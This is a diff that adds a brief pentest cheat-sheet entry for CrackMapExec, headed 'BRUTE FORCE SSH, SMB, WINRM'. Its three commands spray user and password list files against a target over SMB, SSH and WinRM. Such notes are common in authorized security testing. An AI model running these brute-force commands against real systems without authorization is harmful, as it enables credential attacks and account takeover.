@@ -1,0 +1,12 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  CRACKMAPEXEC
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-03[Aug-Mon]23-24PM 
+
+BRUTE FORCE SSH, SMB, WINRM
+
+crackmapexec smb ip -u users.txt -p passwords.txt
+crackmapexec ssh ip -u users.txt -p passwords.txt
+crackmapexec winrm ip -u users.txt -p passwords.txt
